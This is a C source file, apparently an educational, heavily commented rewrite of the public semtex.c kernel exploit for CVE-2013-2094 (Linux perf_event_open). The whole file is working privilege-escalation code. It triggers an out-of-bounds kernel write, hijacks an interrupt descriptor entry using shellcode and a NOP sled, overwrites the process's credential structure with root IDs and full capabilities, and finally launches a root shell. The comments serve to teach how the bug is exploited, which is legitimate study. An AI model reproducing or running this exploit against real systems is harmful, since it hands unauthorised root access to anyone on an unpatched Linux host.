/*
 * this is a rewritten and slightly deobfuscated version of the original
 * CVE-2013-2094 exploit semtex.c that can be found (as of May 20, 2013) at
 * http://fucksheep.org/~sd/warez/semtex.c
 *
 * This exploit was rewritten mostly to help people understand how it works.
 *
 * A blog post with more info can be found at:
 * http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
 */

#define _GNU_SOURCE 1
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <syscall.h>
#include <stdint.h>
#include <assert.h>

#include <inttypes.h>

#define BASE   0x380000000
#define SIZE   0x010000000   /* 256 megabytes */
#define KSIZE  0x002000000   /*  32 megabytes */

/* a macro to generate unique-enough bit patterns */
#define GENERATE_MARKER(x) ((uint64_t)((0xababababLL<<32)^((uint64_t)((x)*313337))))

/*
 * this shell code will be copied to a piece of userland memory and will be the
 * first piece of code (after a series of NOPs) that a hijacked IDT handler will
 * execute.
 *
 * this code swaps out the gs register used by the userland process with a value
 * stored in a model specific register. this register is used in the kernel to
 * access internal information and it must be swapped in on entry to the kernel
 * and swapped out on exit.
 */
static char shellcode[] = "\x0f\x01\xf8"       /*  swapgs		     */
			  "\xe8\x05\x0\x0\x0"  /*  callq  <shellcode + 0xd>  
			  			*  (this callq transfers
			  			*  exeuction to after this piece
			  			*  of shell code where the
			  			*  fix_idt_and_overwrite_creds
			  			*  function will live)
			  			*/
			  "\x0f\x01\xf8"       /*  swapgs		     */
			  "\x48\xcf";	       /*  iretq$		     */

static size_t shellcode_sz = 13;	       /* 13 byte shellcode	     */

/*
 * this function was originally called fuck and its purpose is to search its
 * current stack (which is a kernel stack, since this code will be executed by
 * the kernel) looking for a pointer to the current task_struct.
 *
 * linux kernel stacks start with a struct thread_info that look like this:
 *
 * struct thread_info {
 *  struct task_struct	*task;   // <--- pointer to current task_struct
 *
 * the task structure contains lots of fields, but the one we are most
 * interested in are:
 *
 * struct task_struct { 
 *   // ...
 *   const struct cred *real_cred; 
 * 
 * and struct cred contains:
 *
 * struct cred {
 *   // ...
 *   uid_t           uid;
 *   gid_t           gid;
 *   uid_t           suid;
 *   gid_t           sgid;
 *   uid_t           euid;
 *   gid_t           egid;
 *   uid_t           fsuid;
 *   gid_t           fsgid;
 *   unsigned        securebits;
 *   kernel_cap_t    cap_inheritable;
 *   kernel_cap_t    cap_permitted;
 *   kernel_cap_t    cap_effective;
 *
 * if the code is able to find and overwrite these fields, it can then elevate
 * the process to root and execute a shell as root
 */
static void fix_idt_and_overwrite_creds() {

  int i, j, k;

  /* create a few markers which will be filled in with the
   * ((group id << 32) | user id) later by the exploit.
   */
  uint64_t uids[4] = {	GENERATE_MARKER(2),
			GENERATE_MARKER(3),
			GENERATE_MARKER(4),
			GENERATE_MARKER(5)
  };

  /* kernel stacks are usually 8192 bytes on Linux. thus, we can take the
   * address of a stack allocated variable and mask off a few bits to find
   * what is the base of the kernel stack where the thread_info struct lives.
   */

  /* current is (hopefully) pointing at the start of thread_info which contains
   * the current task_struct pointer.
   */
  uint8_t *current = *(uint8_t **)(((uint64_t)uids) & (-8192));

  /* the task_struct is allocated in kernel memory. grab the top 28 bits to use
   * as an estimate to determine if other addresses are kernel addresses
   * (see below).
   */
  uint64_t kbase = ((uint64_t)current)>>36;

  /* This marker will eventually be replaced by the address of the upper 32-bits
   * of the IDT handler address we are overwiting.
   *
   * Thus, the write on the following line to -1 will restore the original value
   * of the IDT entry which we will overwrite 
   */
  uint32_t *fixptr = (void*) GENERATE_MARKER(1);
  *fixptr = -1;

  /* this for loop will search through a lot of RAM to try to locate the
   * credentials structure in memory and overwrite the various uids/gids
   * and capabilities structures.
   */
  for (i=0; i<4000; i+=4) {

    /* hopefully, p is pointing at part of the current task's task_struct */
    uint64_t *p = (void *) &current[i];

     /* t is pointing at the start of the memory region p points to, which 
      * (hopefully) is the real_creds struct in our process' task_struct
      *
      * if it isn't, this outer loop continues, hopefully moving p closer to
      * what we are searching for.
      */
    uint32_t *t = (void *) p[0];

    /* this if statement checks to see if we have found the pointer to
     * the credentials structure "real_cred".
     *
     * to do this, the exploit checks two conditions:
     *   1.) p[0] != p[1] -- our process' real_cred pointer should be the same
     *                       as the cred pointer if we have found our process'
     *			     task struct.
     *
     *   2.) (p[0] >> 36 != kbase) -- our process' real_cred pointer must be
     *                                in kernel memory, somewhere if this check
     *				      fails, we probably found something that
     *				      isn't actually the real_creds pointer, but
     *				      is some other thing in task_struct
     */
    if ((p[0] != p[1]) || ((p[0]>>36) != kbase))
	    continue;

    /* at this point, we believe that p[0] is a pointer to real_creds, and so
     * t is pointing to real_creds.
     *
     * we need to scan across a bunch of bytes because struct cred
     * has a few fields before the UID/GID field.
     */
    for (j=0; j<20; j++) {
            /* there are 8 32-bit uid / gid fields that we will check
             * to ensure they match our process' uid / gid
             */
	    for (k = 0; k < 8; k++) {
		    if (((uint32_t*)uids)[k] != t[j+k]) {
			    goto next;
		    }
	    }

	    /* if we've made it here, t[j] is the first 32-bit uid field
             * in struct cred.
             *
             * this loop sets all 8 uid/gid fields to 0 (root)
             */
	    for (i = 0; i < 8; i++) {
		    t[j+i] = 0;
	    }

            /* this field sets the capability sets to -1, which enables
             * all capabilities (and overwrites some other fields after the 
             * capability sets).
             */
	    for (i = 0; i < 10; i++) {
		    t[j+9+i] = -1;
	    }

	    return;
next:;    }
  }
}

/* this is just a wrapper function to call perf_event_open with the necessary
 * structure required to execute the buggy kernel code path.
 */
static void
break_perf_event_open (uint32_t off) {

	struct perf_event_attr pea = {
		.type	= PERF_TYPE_SOFTWARE,
		.size	= sizeof(struct perf_event_attr),
		.config	= off,
		.mmap	= 1,
		.freq	= 1,
	};

	/*
	 * there is no wrapper for perf_event_open in glibc (on CentOS 6, at least),
	 * so you need to use syscall(2) to call it.
	 *
	 * I copied the arguments out of the kernel (with the kernel explanation of
	 * some of them) here for convenience.
	 */
	int fd = syscall(__NR_perf_event_open,
			&pea,	/* struct perf_event_attr __user *attr_uptr	  */
			   0,	/* pid_t	      pid	(target pid)	  */
			  -1,	/* int		      cpu	(target cpu)	  */
			  -1,	/* int		      group_fd	(group leader fd) */
			  0);	/* unsigned long      flags			  */

	if (fd < 0) {
		perror("perf_event_open");
		exit(EXIT_FAILURE);
	}

	if (close(fd) != 0) {
		perror("close");
		exit(EXIT_FAILURE);
	}

	return;
}

int
main(int argc, char *argv[])
{
	uint64_t u,g,needle, kbase, *p;
	uint8_t *code = NULL;
	uint32_t *map = NULL;
	int i = 0;
	int j = 0;

	struct {
		uint16_t limit;
		uint64_t addr;
	} __attribute__((packed)) idt;

	/*
	 * allocate SIZE bytes at address BASE -- this mmap call is a rewritten
	 * version of the mmap call from the original exploit at line 63
	 */
	map = mmap((void *) BASE, SIZE,
			PROT_READ | PROT_WRITE,
			MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE,
			-1,
			0);

	if (map != (void *) BASE) {
		fprintf(stderr, "mmap was unable to get fixed address: %lx\n", BASE);
		exit(EXIT_FAILURE);
	}

	memset(map, 0, SIZE);

	/*
	 * call perf_event_open and pass in negative values which will cause the
	 * kernel to scribble over some memory in our mmaped region we allocated above.
	 *
	 * these calls correspond to the two calls to sheep on line 65 of the
	 * original exploit.
	 */
	break_perf_event_open(-1);
	break_perf_event_open(-2);

	/*
	 * verify that the kernel has actually written data into the region we
	 * mapped in with our call to mmap and store the 4-byte offset into the
	 * region for use later.
	 *
	 * this for loop corresponds with lines 66-69 of the original exploit
	 */
	for (i = 0; i < SIZE/4; i++) {
		uint32_t *tmp = map + i;
		/* 
		 * check if map[i] (aka tmp) is non zero.
		 * also check if map[i+1] (aka tmp+1) is non zero.
		 *
		 * if both are non zero that means our calls above
		 * break_perf_event_open(-1) and break_perf_event_open(-2) have
		 * scribbled over memory this process allocated with mmap.
		 *
		 * since this code incrememnts by 4 bytes each time, the
		 * implication is that each entry in the array we are able to
		 * overwrite have a width of 4.
		 */
		if (*tmp && *(tmp + 1)) {
			break;
		}
	}

	/* 
	 * if we didn't find any non-zero bytes in the map that means our map
	 * is probably in the wrong place or the initial calls to perf_open_event
	 * did not write values into the wrong memory regions as
	 * we expected.
	 */
	if (i >= (SIZE/4)) {
		fprintf(stderr, "Unable to get the kernel to scribble over our"
				"memory!\n");
		fprintf(stderr, "Probably you need to adjust BASE and/or SIZE to get"
				"it to hit!\n");
		exit(EXIT_FAILURE);
	}

	/*
	 * the "sidt" instruction retrieves the base Interrupt Descriptor Table 
	 *
	 * this instruction and the subsequent mask correspond to lines 71-72 in
	 * the original exploit.
	 */
	asm volatile ("sidt %0" : "=m" (idt));
	kbase = idt.addr & 0xff000000;

	/* allocate KSIZE bytes at address kbase */
	code = mmap((void *) kbase, KSIZE,
			PROT_READ | PROT_WRITE | PROT_EXEC,
			MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE,
			-1,
			0);

	if (code != (void *) kbase) {
		fprintf(stderr, "Unable to map memory at address: %p\n", code);
		exit(EXIT_FAILURE);
	}

	/*
	 * fill the region of memory we just mapped with 0x90 which is the x86
	 * NOP instruction.
	 */
	memset(code, 0x90, KSIZE);

	/* move the code pointer up to the start of the last 1024 bytes of the
	 * mapped region.
	 *
	 * this leaves (32 megabytes - 1024 bytes) of NOP instructions in
	 * memory.
	 */
	code += (KSIZE-1024);

	/* copy the code for the function above to the memory region */
	memcpy(code, &fix_idt_and_overwrite_creds, 1024);

	/* copy our shell code just before the code above */
	memcpy(code - shellcode_sz, shellcode, shellcode_sz);

	/* get the current userid and groupids */
	u = getuid();
	g = getgid();

	/* set all user ids and group ids to be the same, this will help find this
         * process' credential structure later.
         */
	setresuid(u, u, u);
	setresgid(g, g, g);

	/* the next section of code searches for a series of "markers"
	 * in the code copied over from the "fix_idt_and_overwrite_creds"
	 * function and replaces most of * them with a 64bit int of
	 * the current userid/gid.
	 */

	/* the values the code is searching for will be
	 * j = 5, memmem will fail
	 * value [5]: abababab0017e7dd
	 * value [4]: abababab00131fe4
	 * value [3]: abababab000e57eb
	 * value [2]: abababab00098ff2
	 * value [1]: abababab0004c7f9   <--- this one gets set to idt.addr + 0x48
	 *				      (which will be the top half of interrupt 4's IDT gate...
	 *				       the high 4 bytes of the offset)
	 */
	for (j = 5; j > 0; j--) {
		/* generate marker values */
		needle = GENERATE_MARKER(j);

		/* find marker values in the malicious code copied to our memory
		 * region
		 */
		p = memmem(code, 1024, &needle, 8);
		if (!p) {
			fprintf(stderr, "couldn't find the marker values (this is"
					"bad)\n");
			break;
		}

		if (j > 1) {
			/* marker values [2 - 5] will be replaced with the
			 * uid/gid of this process.
			 */
			*p = ((g << 32) | u);
		} else {
			/* marker value 1 will be replaced with the offset of
			 * the IDT handler we will highjack. this address will
			 * be used to restore the overwritten state later.
			 */
			*p = idt.addr + 0x48;
		}
	}

	break_perf_event_open(-i + (((idt.addr&0xffffffff)-0x80000000)/4) + 16);

	/*
	 * trigger the highjacked interrupt handler
	 */
	asm volatile("int $0x4");

	/*
	 * at this point we should be able to set the userid of this process to
	 * 0.
	 */
	if (setuid(0) != 0) {
		perror("setuid");
		exit(EXIT_FAILURE);
	}

	/*
	 * launch bash as uid 0
	 */
	return execl("/bin/bash", "-sh", NULL);
}
